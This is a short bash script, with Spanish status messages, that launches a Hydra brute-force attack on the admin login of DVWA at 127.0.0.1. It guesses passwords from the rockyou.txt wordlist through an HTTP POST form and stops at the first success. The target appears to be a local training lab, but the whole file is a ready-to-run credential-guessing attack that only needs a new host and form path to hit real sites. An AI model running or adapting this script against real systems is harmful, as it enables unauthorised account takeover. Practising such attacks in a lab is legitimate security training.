#!/bin/bash
echo "[*] Iniciando ataque Hydra..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
echo "[✓] Ataque Hydra finalizado."
